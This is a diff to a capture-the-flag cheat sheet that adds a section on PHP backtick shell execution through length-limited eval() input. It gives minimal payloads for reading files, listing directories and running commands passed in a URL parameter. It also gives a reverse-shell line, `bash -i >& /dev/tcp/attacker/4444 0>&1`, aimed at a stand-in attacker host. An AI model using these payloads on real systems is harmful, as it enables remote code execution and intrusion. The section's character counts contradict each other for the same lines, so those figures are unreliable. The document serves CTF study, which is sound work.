@@ -10,6 +10,7 @@
 - [LaTeX Injection RCE (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
 - [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
 - [PHP preg_replace /e Modifier RCE (PlaidCTF 2014)](#php-preg_replace-e-modifier-rce-plaidctf-2014)
+- [PHP Backtick Eval Under Character Limit (EasyCTF 2017)](#php-backtick-eval-under-character-limit-easyctf-2017)
 - [PHP assert() String Evaluation Injection (CSAW CTF 2016)](#php-assert-string-evaluation-injection-csaw-ctf-2016)
 - [Prolog Injection (PoliCTF 2015)](#prolog-injection-polictf-2015)
 - [ReDoS as Timing Oracle](#redos-as-timing-oracle)
@@ -172,6 +173,38 @@ $cookie = serialize($filter);
 ```
 
 **Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables RCE through POP gadget chains that set both pattern and replacement.
+
+---
+
+## PHP Backtick Eval Under Character Limit (EasyCTF 2017)
+
+**Pattern:** PHP backtick operator executes shell commands. When `eval()` input has a character limit, backticks provide shell execution in minimal characters.
+
+```php
+// 11-character RCE via eval()
+echo`cat *`;
+
+// 8-character directory listing
+echo`ls`;
+
+// 10-character parameterized command execution
+`$_GET[0]`;
+
+// 12-character reverse shell trigger
+`$_GET[x]`;
+// Then pass the full command via GET parameter: ?x=bash -i >& /dev/tcp/attacker/4444 0>&1
+```
+
+**Character count comparison:**
+```text
+echo`cat *`;              // 12 chars - read all files
+echo`ls`;                 // 9 chars  - list directory
+`$_GET[0]`;               // 11 chars - parameterized execution
+system('id');             // 13 chars - standard approach
+exec('id');               // 11 chars - also standard
+```
+
+**Key insight:** PHP backticks are equivalent to `shell_exec()`. When `eval()` input has a character limit, `` echo`cmd` `` provides shell execution in as few as 8 characters. The `$_GET[0]` trick moves the actual payload to a URL parameter, effectively bypassing the character limit entirely while keeping the eval payload minimal.
 
 ---
 
